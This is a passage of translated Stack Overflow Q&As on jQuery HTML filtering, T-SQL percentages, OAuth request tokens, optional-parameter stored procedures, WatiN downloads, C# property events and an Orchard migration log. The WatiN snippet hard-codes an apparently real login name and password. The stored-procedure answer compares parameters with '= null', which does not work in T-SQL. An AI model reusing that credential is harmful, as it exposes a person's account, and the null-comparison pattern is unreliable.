</div>
<div id="content"></div> 
```

page1.html：

```
<div class="container">
any html
<span data-search="type1">blue</span>
any html
</div>
<div class="container">
any html
<span data-search="type1">blue <span class="variable">flower</span></span>
any html
</div>
<div class="container">
any html
<span data-search="type1">  blue    <span class="variable">shirt</span></span>
any html
</div>
<div class="container">
any html
<span data-search="type1">non-matching html</span>
<!-- no match inside, skip this .container -->
any html
</div>
<div class="container">
any html
<span data-search="type2">blue</span>
<!-- "data-search" attribute doesn't match a "data-search" attribute of the first "data-search"-attribute-containing element that we encounter when we traverse from .click up the DOM, so skip this .container -->
any html
</div>
<div class="container">
any html
<span data-search="type1">blue<span class="variable">berry</span></span>
<!-- no space after "blue", so "berry" is a part of the word -->
any html
</div> 
```

单击“.click”元素后，我想使用`$.get`方法。
对于“click1”元素，我希望 #content 是

```
<div id="content">
<div class="container">
any html
<span data-search="type1">blue</span>
any html
</div>
</div> 
```

对于“click2”元素，我希望 #content 是

```
<div id="content">
<div class="container">
any html
<span data-search="type1">blue <span class="variable">flower</span></span>
any html
</div>
<div class="container">
any html
<span data-search="type1">  blue    <span class="variable">shirt</span></span>
any html
</div>
</div> 
```

对于“click3”元素，我希望 #content 是

```
<div id="content">
<div class="container">
any html
<span data-search="type1">blue<span class="variable">berry</span></span>
<!-- no space after "blue", so "berry" is a part of the word -->
any html
</div>
</div> 
```

我不知道这是否很棘手，但我没有这样的脚本技能，这对我来说很有趣，所以请帮助我或告诉我为什么这个想法不好。

**编辑：我的问题的先前版本不正确，所以我修改了它。**
如果我应该展示我尝试过的东西，我可以展示我现在的位置。这个脚本不起作用。（我正在简化正则表达式并删除整个`.variable`元素）

```
<script>
    $(document).ready(function () {
        $('.click').click(function () {
            $("#content").empty();
            var search = $(this).html().replace(/<span class=\"variable\">(.*?)<\/span>/i, "");
            var type = $(this).parents('[data-search]').first().attr('data-search');
            var page = $(this).attr('data-source');
            $.get(page, {}, function (data) {
                var $response = $('<div />').html(data);
                var $content = $response.find('.container').filter(function (index) {
                    return $(this).contents().filter(function (index) {
                        return $(this).attr('data-search') == type && $(this).html().replace(/<span class=\"variable\">(.*?)<\/span>/i, "") == search;
                    }).length > 0;
                });
                $('#content').append($content);
            }, 'html');
        });
    });
</script> 
```

但即使单击`<span class="click" data-source="page1.html">blue</span>`并期望`<div class="container">any html<span data-search="type1">blue</span>any html</div>`出现，也不会发生任何事情。问题是我不知道如何返回所有包含至少一个与此过滤器匹配的元素的容器：`$(this).attr('data-search') == type && $(this).html().replace(/<span class=\"variable\">(.*?)<\/span>/i, "") == search`.

我应该澄清正则表达式的逻辑。
1\. 整个`.variable`元素被替换为一个特殊符号（比如星号）；
2\. 非空格字符之间的空格、制表符和换行符被替换为一个空格字符；3\. 删除/元素
开头和结尾的空格、制表符和换行符。`.click``[data-search]`

例如，`.click`/`[data-search]`这个结构的元素：

```
<span>   match<span class="variable">variable1</span>    <span class="variable">variable2</span> match</span> 
```

变成

```
<span>match* * match</span> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T08:47:08.457

这是一组将匹配您的三点的正则表达式：

```
// Remove .variable element
input = input.replace(/<span\s+class\s*=\s*"variable">.+?<\/span>/img, '*');

// Replace whitespaces, tabs and linebreaks between the non-space characters with one space char
input = input.replace(/\s+/g, ' ');

// Remove whitespaces, tabs and linebreaks in the beginning and in the end
input = input.replace(/^\s*<span>\s*/m, "<span>");
input = input.replace(/\s*<\/span>\s*$/m, "</span>"); 
```

**演示** [http://jsfiddle.net/NuBre/](http://jsfiddle.net/NuBre/)

# sql-server - TSQL 计算百分比

> ID：13061390
> 
> 赞同：3
> 
> 时间：2012-10-25T04:03:18.640
> 
> 标签：sql-server, tsql

我在一个健身俱乐部的 SQL Server 数据库中有一个客户列表。客户列出了他们加入的日期和他们续订的次数我希望能够计算出续订客户的百分比。关于如何做到这一点的任何想法？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T04:54:25.040

如果有一个表`subscriptions`，每个用户只有一行，则会更新一点`isrenewed`：

```
 SELECT 
    SUM(SIGN(isrenewed)) * 100 / COUNT(*) 
    AS Percentage
    FROM subscriptions 
```

输出

```
 Percentage
 ---------------
 66,666666 
```

如果要对表达式进行四舍五入，可以将其转换为 int

```
 SELECT 
    CAST(
      SUM(SIGN(isrenewed)) * 100 / COUNT(*) 
      AS int)
    AS Percentage
    FROM subscriptions 
```

输出

```
 Percentage
 ---------------
 66 
```

如果您有一个`subscriptions`包含用户特定列的表，`userid`其中有两行意味着订阅已更新：

```
SELECT 
  (SELECT TOP 1 COUNT(*) OVER() 
    FROM subscriptions
    GROUP BY userid
    having COUNT(*) > 1) 
  * 100 / COUNT(*) AS Percentage
  FROM subscriptions 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:50:51.657

这是你想要的

```
Declare @t table(Id Int Identity,CustomerName Varchar(50),DOJ Datetime,IsRenewed bit)
Insert Into @t Values('Name1','1/1/2012',1),('Name2','10/1/2012',1),('Name3','10/2/2012',0)

Select PercentageCustomerRenewed = 
Cast((Count(*) * 100) / (Select Count(*) From @t ) AS Numeric(10,2))  
From @t 
where IsRenewed = 1 
```

**结果**

```
PercentageCustomerRenewed
66.00 
```

# asp.net-mvc - 适用于 MVC 流的 OAuth 2.0

> ID：13061407
> 
> 赞同：3
> 
> 时间：2012-10-25T04:05:44.687
> 
> 标签：asp.net-mvc, asp.net-web-api, oauth-2.0

我正在使用 MVC 的 OAuth 2.0，可以在这里找到：

[http://community.codesmithtools.com/CodeSmith_Community/b/tdupont/archive/2011/03/18/oauth-2-0-for-mvc-two-legged-implementation.aspx#comments](http://community.codesmithtools.com/CodeSmith_Community/b/tdupont/archive/2011/03/18/oauth-2-0-for-mvc-two-legged-implementation.aspx#comments)（这是一些链接light 文档，其中包含项目下载的链接）。

我试图弄清楚流程是如何工作的。它似乎是这样的：

1.  从 RequestToken 控制器方法中获取 RequestToken
2.  然后控制器将请求令牌传递给 OAuthServiceBase.Instance.AccessToken。这最终会转到继承抽象 OAuthServiceBase 类的 DemoService 类。此方法使用 RequestToken 对用户名进行哈希处理，然后将其与密码（也已使用 RequestToken 进行哈希处理和加盐处理）进行比较。如果它们匹配，它会发出一个 AccessToken。这是示例逻辑 - 这里有一条说明，在真实的应用程序中，你应该去获取用户的凭据。

这让我对以下几点感到很困惑：

1.  我无法理解 RequestToken 的用途。RequestToken 将在 5 分钟后过期 - 因此，即使示例逻辑使用它对用户名和密码散列进行加盐，我也看不到任何可能的方法可以用它加盐用户的散列密码。
2.  尽管有上述规定，我在此应用程序中看不到任何用于加密密码哈希的机制。我错过了什么吗？我不想在客户端持久存储盐，所以我不必将未加密的密码存储在数据库中吗？如果我有一个持久盐，我可以将散列和加盐密码存储在数据库中，并将盐存储在客户端，然后将散列密码传递给身份验证。

正如您可能知道的那样，我通常是编写身份验证代码的新手。我知道我在这里遗漏了一些东西，我只是不知道它是什么:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T10:24:14.997

Oauth 用于为您的程序提供第三方访问权限，它主要用于`api's`.

RequestToken 不应该用来加盐用户名、密码或其他任何东西。当您与 Web 服务通信时，您会从 Oauth 获得一个 RequestToken。请求令牌有 5 分钟的时间跨度，之后您应该请求一个新令牌。

使用 RequestToken 的主要优点是关注点分离。在图片中，只有 OAuth2 授权服务器必须知道用户名和密码。Google UserInfo 服务知道一组用于某些操作的有效令牌。在这种情况下请求帐户信息。

从谷歌的 oauth 实现中检查这张图片。我希望这一切都清楚。

![在此处输入图像描述](../Images/d9bfef08f765531fe81f011c261537fd.png)

# sql - 从网站创建具有许多参数的存储过程

> ID：13061409
> 
> 赞同：1
> 
> 时间：2012-10-25T04:05:45.770
> 
> 标签：sql, sql-server, database

我有一个关于在 SQL Server 中设计存储过程的一般性问题：

我有一个网站，用户可以使用多达 30 个属性进行搜索（这意味着他可以使用所有 30 个条件，也可以只使用 5 个）。

您将如何为此设计存储过程？在设计此程序时，您会记住什么？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:10:18.073

您可能需要查看动态 sql。

这是我认为的一些有价值的信息：http: [//www.sommarskog.se/dynamic_sql.html](http://www.sommarskog.se/dynamic_sql.html)

本质上，您将根据用户的条件动态构建您的 sql 查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:10:26.280

你可以这样做：

```
create procedure foo
@param1 int = null,
@param2 int = null,
@param3 int = null,
... 
```

然后在你的 where 子句中你可以这样做：

```
where (@param1 = null or @param1 = somevalue)
    and (@param2 = null or @param2 = somevalue)
    .... 
```

通过具有可为空的参数，您可以轻松地将任何参数组合传递给您的存储过程。请注意观察您的执行计划并确保不会发生参数嗅探。

# c# - 等待从网页下载文件

> ID：13061411
> 
> 赞同：0
> 
> 时间：2012-10-25T04:05:56.027
> 
> 标签：c#, watin

我有以下代码执行几个网页重定向，然后单击具有 JavaScript 函数作为 href 的标签。当它被调用时，文件正在下载。我的问题是我希望能够在不提示取消、保存或打开的情况下下载文件。我正在使用 IE9。

```
using (var browser = new IE("http:url.aspx")) {
    browser.TextField(Find.ByName("ctl00$ContentPlaceHolder1$Login1$UserName")).TypeText("cpereyra");
    browser.TextField(Find.ByName("ctl00$ContentPlaceHolder1$Login1$Password")).TypeText("Maxipereyra15");

    browser.Button(Find.ByName("ctl00$ContentPlaceHolder1$Login1$LoginButton")).Click();

    browser.GoTo("http://it-motivity-cmc/Movation/MyPage/MyDashboard.aspx?dynamicdashboardid=ab000000-7dea-11c9-b596-d01e04bebb94");

    while (browser.Eval("document.readyState") != "complete") {
        Thread.Sleep(1000); 
    }

    Div div = browser.Div("ctl00_ContentPlaceHolder1_wrapper_vis_zone1_1");
    div.Link(link => link.Text == "Export to CSV").Click();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:58:46.733

您必须检查 js 函数内部，然后复制它所做的调用以下载文件。要查看函数，只需打开 js 控制台（ F12 ）输入不带括号的函数名称，就会出现函数体。您可能会在函数内找到一个干净的链接。

# c# - 为值设置和验证反馈设计一个 Manager 类

> ID：13061415
> 
> 赞同：0
> 
> 时间：2012-10-25T04:06:32.927
> 
> 标签：c#, events, n-tier-architecture

我想编写一个 DesignManager 类来监督和管理 Item 的值。

项目具有许多属性，并且相互依赖，并为彼此设置了某些价值规则。这些值在 UI 级别输入到 Item 变量中，DesignManager 检测更改，进行验证/计算并向 UI 报告（通过事件）。

我现在的问题是围绕属性设置器模式。我已经想到了两种完成关系的方法，每种方法都有其优点/缺点，希望得到建议使用哪一种：

```
// Syntax is cleaner
// DesignManager does not know about the change Item notifies DesignManager
// Nested collections can notify DesignManager, but there is problem of identifying the sender
DesignManager.Item.Property = value;

// Syntax is not clean
// Hard to support value setting of nested Items or collections within Items
// DesignManager immediately gets informed of the change via the calling UI logic.
DesignManager.SetItemProperty(value); 
```

我不知道我更喜欢哪一个，因为我看不到与每一个相关的所有警告。目前，我最大的问题是 Item 中的嵌套集合。

如果哪位有这方面的经验，希望可以指教。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:16:55.350

这是来自 ac# 数据库 linq 映射的片段：

```
 public int id
    {
        get
        {
            return this._id;
        }
        set
        {
            if ((this._id != value))
            {
                this.OnidChanging(value);
                this.SendPropertyChanging();
                this._id = value;
                this.SendPropertyChanged("id");
                this.OnidChanged();
            }
        }
    } 
```

Microsoft 采用第三种方式并使用属性，这些属性在 set 函数中触发事件。onchange - 事件在更改之前发送，因此可用于否决更改（未从 MS 实现）。Microsoft 不会对类的每个属性进行分隔，只有一个事件包含属性名称。在您的经理中，您可以订阅事件并根据需要验证/计算属性。

# orchardcms - Orchard 模块 一些功能需要升级 facebook.lite

> ID：13061419
> 
> 赞同：-1
> 
> 时间：2012-10-25T04:07:03.450
> 
> 标签：orchardcms

我收到此消息，但无法找出问题所在，这是我在 APP_DATA 中的日志文件中的转储。任何人有任何想法如何清除？

```
2012-10-25 03:28:11,250 [5] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:32:25,938 [19] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:32:30,548 [19] Orchard.Exceptions.DefaultExceptionPolicy - An unexpected exception was caught
System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Data.SqlClient.SqlException: The default schema does not exist.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async)
   at System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(DbAsyncResult result, String methodName, Boolean sendToPipe)
   at System.Data.SqlClient.SqlCommand.ExecuteNonQuery()
   at Orchard.Data.Migration.Interpreters.DefaultDataMigrationInterpreter.RunPendingStatements() in c:\Build\Orchard\src\Orchard\Data\Migration\Interpreters\DefaultDataMigrationInterpreter.cs:line 347
   at Orchard.Data.Migration.Interpreters.DefaultDataMigrationInterpreter.Visit(CreateTableCommand command) in c:\Build\Orchard\src\Orchard\Data\Migration\Interpreters\DefaultDataMigrationInterpreter.cs:line 93
   at Orchard.Data.Migration.Interpreters.AbstractDataMigrationInterpreter.Visit(ISchemaBuilderCommand command) in c:\Build\Orchard\src\Orchard\Data\Migration\Interpreters\AbstractDataMigrationInterpreter.cs:line 14
   at Orchard.Data.Migration.Schema.SchemaBuilder.CreateTable(String name, Action`1 table) in c:\Build\Orchard\src\Orchard\Data\Migration\Schema\SchemaBuilder.cs:line 19
   at Orchard.Indexing.Migrations.Create()
   --- End of inner exception stack trace ---
   at System.RuntimeMethodHandle._InvokeMethodFast(IRuntimeMethodInfo method, Object target, Object[] arguments, SignatureStruct& sig, MethodAttributes methodAttributes, RuntimeType typeOwner)
   at System.RuntimeMethodHandle.InvokeMethodFast(IRuntimeMethodInfo method, Object target, Object[] arguments, Signature sig, MethodAttributes methodAttributes, RuntimeType typeOwner)
   at System.Reflection.RuntimeMethodInfo.Invoke(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture, Boolean skipVisibilityChecks)
   at System.Reflection.RuntimeMethodInfo.Invoke(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)
   at Orchard.Data.Migration.DataMigrationManager.Update(String feature) in c:\Build\Orchard\src\Orchard\Data\Migration\DataMigrationManager.cs:line 96
   at Orchard.Data.Migration.DataMigrationCoordinator.Installing(Feature feature) in c:\Build\Orchard\src\Orchard\Data\Migration\DataMigrationCoordinator.cs:line 26
   --- End of inner exception stack trace ---
   at System.RuntimeMethodHandle._InvokeMethodFast(IRuntimeMethodInfo method, Object target, Object[] arguments, SignatureStruct& sig, MethodAttributes methodAttributes, RuntimeType typeOwner)
   at System.RuntimeMethodHandle.InvokeMethodFast(IRuntimeMethodInfo method, Object target, Object[] arguments, Signature sig, MethodAttributes methodAttributes, RuntimeType typeOwner)
   at System.Reflection.RuntimeMethodInfo.Invoke(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture, Boolean skipVisibilityChecks)
   at System.Reflection.RuntimeMethodInfo.Invoke(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)
   at Orchard.Events.DefaultOrchardEventBus.TryInvokeMethod(IEventHandler eventHandler, Type interfaceType, String methodName, IDictionary`2 arguments, IEnumerable& returnValue) in c:\Build\Orchard\src\Orchard\Events\DefaultOrchardEventBus.cs:line 80
   at Orchard.Events.DefaultOrchardEventBus.TryInvoke(IEventHandler eventHandler, String interfaceName, String methodName, IDictionary`2 arguments, IEnumerable& returnValue) in c:\Build\Orchard\src\Orchard\Events\DefaultOrchardEventBus.cs:line 68
   at Orchard.Events.DefaultOrchardEventBus.TryNotifyHandler(IEventHandler eventHandler, String messageName, String interfaceName, String methodName, IDictionary`2 eventData, IEnumerable& returnValue) in c:\Build\Orchard\src\Orchard\Events\DefaultOrchardEventBus.cs:line 52
2012-10-25 03:32:34,923 [15] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:32:34,923 [15] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Orchard.Indexing
2012-10-25 03:32:35,376 [15] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:32:35,392 [15] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Orchard.Indexing
2012-10-25 03:36:39,173 [16] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:36:39,188 [16] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Orchard.Indexing
2012-10-25 03:36:57,690 [5] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:36:57,705 [5] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Orchard.Indexing
2012-10-25 03:39:38,121 [16] NHibernate.AdoNet.AbstractBatcher - Could not execute query: INSERT INTO dbo_Orchard_Indexing_IndexingTaskRecord (Action, CreatedUtc, ContentItemRecord_id) VALUES (@p0, @p1, @p2); select SCOPE_IDENTITY()
System.Data.SqlClient.SqlException (0x80131904): Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
   at System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader()
   at NHibernate.AdoNet.AbstractBatcher.ExecuteReader(IDbCommand cmd)
2012-10-25 03:39:38,168 [16] NHibernate.Util.ADOExceptionReporter - Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
2012-10-25 03:39:38,168 [16] Orchard.ContentManagement.DefaultContentManager - GenericADOException thrown from IContentHandler by Orchard.Indexing.Handlers.CreateIndexingTaskHandler
NHibernate.Exceptions.GenericADOException: could not insert: [Orchard.Indexing.Models.IndexingTaskRecord][SQL: INSERT INTO dbo_Orchard_Indexing_IndexingTaskRecord (Action, CreatedUtc, ContentItemRecord_id) VALUES (?, ?, ?); select SCOPE_IDENTITY()] ---> System.Data.SqlClient.SqlException: Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
   at System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader()
   at NHibernate.AdoNet.AbstractBatcher.ExecuteReader(IDbCommand cmd)
   at NHibernate.Id.IdentityGenerator.InsertSelectDelegate.ExecuteAndExtract(IDbCommand insert, ISessionImplementor session)
   at NHibernate.Id.Insert.AbstractReturningDelegate.PerformInsert(SqlCommandInfo insertSQL, ISessionImplementor session, IBinder binder)
   --- End of inner exception stack trace ---
   at NHibernate.Id.Insert.AbstractReturningDelegate.PerformInsert(SqlCommandInfo insertSQL, ISessionImplementor session, IBinder binder)
   at NHibernate.Persister.Entity.AbstractEntityPersister.Insert(Object[] fields, Boolean[] notNull, SqlCommandInfo sql, Object obj, ISessionImplementor session)
   at NHibernate.Persister.Entity.AbstractEntityPersister.Insert(Object[] fields, Object obj, ISessionImplementor session)
   at NHibernate.Action.EntityIdentityInsertAction.Execute()
   at NHibernate.Engine.ActionQueue.Execute(IExecutable executable)
   at NHibernate.Event.Default.AbstractSaveEventListener.PerformSaveOrReplicate(Object entity, EntityKey key, IEntityPersister persister, Boolean useIdentityColumn, Object anything, IEventSource source, Boolean requiresImmediateIdAccess)
   at NHibernate.Event.Default.AbstractSaveEventListener.PerformSave(Object entity, Object id, IEntityPersister persister, Boolean useIdentityColumn, Object anything, IEventSource source, Boolean requiresImmediateIdAccess)
   at NHibernate.Event.Default.AbstractSaveEventListener.SaveWithGeneratedId(Object entity, String entityName, Object anything, IEventSource source, Boolean requiresImmediateIdAccess)
   at NHibernate.Event.Default.DefaultSaveOrUpdateEventListener.SaveWithGeneratedOrRequestedId(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveEventListener.SaveWithGeneratedOrRequestedId(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveOrUpdateEventListener.EntityIsTransient(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveEventListener.PerformSaveOrUpdate(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveOrUpdateEventListener.OnSaveOrUpdate(SaveOrUpdateEvent event)
   at NHibernate.Impl.SessionImpl.FireSave(SaveOrUpdateEvent event)
   at NHibernate.Impl.SessionImpl.Save(Object obj)
   at Orchard.Data.Repository`1.Create(T entity) in c:\Build\Orchard\src\Orchard\Data\Repository.cs:line 96
   at Orchard.Data.Repository`1.Orchard.Data.IRepository<T>.Create(T entity) in c:\Build\Orchard\src\Orchard\Data\Repository.cs:line 36
   at Orchard.Indexing.Services.IndexingTaskManager.CreateTask(ContentItem contentItem, Int32 action)
   at Orchard.Indexing.Services.IndexingTaskManager.CreateUpdateIndexTask(ContentItem contentItem)
   at Orchard.Indexing.Handlers.CreateIndexingTaskHandler.CreateIndexingTask(PublishContentContext context, ContentPart part)
   at Orchard.ContentManagement.Handlers.ContentHandler.InlineStorageFilter`1.Published(PublishContentContext context, TPart instance) in c:\Build\Orchard\src\Orchard\ContentManagement\Handlers\ContentHandler.cs:line 156
   at Orchard.ContentManagement.Handlers.StorageFilterBase`1.Orchard.ContentManagement.Handlers.IContentStorageFilter.Published(PublishContentContext context) in c:\Build\Orchard\src\Orchard\ContentManagement\Handlers\StorageFilterBase.cs:line 80
   at Orchard.ContentManagement.Handlers.ContentHandler.Orchard.ContentManagement.Handlers.IContentHandler.Published(PublishContentContext context) in c:\Build\Orchard\src\Orchard\ContentManagement\Handlers\ContentHandler.cs:line 274
   at Orchard.ContentManagement.DefaultContentManager.<>c__DisplayClass5c.<Create>b__59(IContentHandler handler) in c:\Build\Orchard\src\Orchard\ContentManagement\DefaultContentManager.cs:line 495
   at Orchard.InvokeExtensions.Invoke[TEvents](IEnumerable`1 events, Action`1 dispatch, ILogger logger) in c:\Build\Orchard\src\Orchard\InvokeExtensions.cs:line 17
2012-10-25 03:39:38,387 [16] NHibernate.AssertionFailure - An AssertionFailure occurred - this may indicate a bug in NHibernate or in your custom types.
NHibernate.AssertionFailure: null id in Orchard.Indexing.Models.IndexingTaskRecord entry (don't flush the Session after an exception occurs)
2012-10-25 03:39:38,387 [16] NHibernate.Impl.AbstractSessionImpl - DTC transaction prepre phase failed
NHibernate.AssertionFailure: null id in Orchard.Indexing.Models.IndexingTaskRecord entry (don't flush the Session after an exception occurs)
   at NHibernate.Event.Default.DefaultFlushEntityEventListener.CheckId(Object obj, IEntityPersister persister, Object id, EntityMode entityMode)
   at NHibernate.Event.Default.DefaultFlushEntityEventListener.GetValues(Object entity, EntityEntry entry, EntityMode entityMode, Boolean mightBeDirty, ISessionImplementor session)
   at NHibernate.Event.Default.DefaultFlushEntityEventListener.OnFlushEntity(FlushEntityEvent event)
   at NHibernate.Event.Default.AbstractFlushingEventListener.FlushEntities(FlushEvent event)
   at NHibernate.Event.Default.AbstractFlushingEventListener.FlushEverythingToExecutions(FlushEvent event)
   at NHibernate.Event.Default.DefaultFlushEventListener.OnFlush(FlushEvent event)
   at NHibernate.Impl.SessionImpl.Flush()
   at NHibernate.Transaction.AdoNetWithDistrubtedTransactionFactory.DistributedTransactionContext.System.Transactions.IEnlistmentNotification.Prepare(PreparingEnlistment preparingEnlistment)
2012-10-25 03:42:01,520 [16] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:42:01,520 [16] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Orchard.Indexing
2012-10-25 03:42:01,973 [16] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Facebook.Like
2012-10-25 03:42:01,973 [16] Orchard.Data.Migration.AutomaticDataMigrations - Could not run migrations automatically on Orchard.Indexing
2012-10-25 03:55:10,140 [13] NHibernate.AdoNet.AbstractBatcher - Could not execute query: INSERT INTO dbo_Orchard_Indexing_IndexingTaskRecord (Action, CreatedUtc, ContentItemRecord_id) VALUES (@p0, @p1, @p2); select SCOPE_IDENTITY()
System.Data.SqlClient.SqlException (0x80131904): Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
   at System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader()
   at NHibernate.AdoNet.AbstractBatcher.ExecuteReader(IDbCommand cmd)
2012-10-25 03:55:10,187 [13] NHibernate.Util.ADOExceptionReporter - Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
2012-10-25 03:55:10,187 [13] Orchard.ContentManagement.DefaultContentManager - GenericADOException thrown from IContentHandler by Orchard.Indexing.Handlers.CreateIndexingTaskHandler
NHibernate.Exceptions.GenericADOException: could not insert: [Orchard.Indexing.Models.IndexingTaskRecord][SQL: INSERT INTO dbo_Orchard_Indexing_IndexingTaskRecord (Action, CreatedUtc, ContentItemRecord_id) VALUES (?, ?, ?); select SCOPE_IDENTITY()] ---> System.Data.SqlClient.SqlException: Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
